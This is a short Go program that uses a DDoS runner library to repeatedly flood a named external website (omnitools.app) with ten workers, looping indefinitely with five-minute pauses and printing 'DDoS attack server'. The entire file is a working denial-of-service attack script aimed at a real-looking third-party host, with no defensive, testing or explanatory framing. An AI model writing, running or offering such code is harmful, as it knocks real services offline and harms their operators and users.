package main

import (
	"fmt"
	"time"

	ddos "github.com/null-none/ddos/runner"
)

func main() {

	for {
		workers := 10
		d, err := ddos.New("https://omnitools.app/", workers)
		if err != nil {
			panic(err)
		}
		d.Run()
		time.Sleep(time.Second)
		d.Stop()
		fmt.Println("DDoS attack server: https://omnitools.app/")
		// Output: DDoS attack server: http://127.0.0.1:80

		time.Sleep(5 * time.Minute)
	}

}
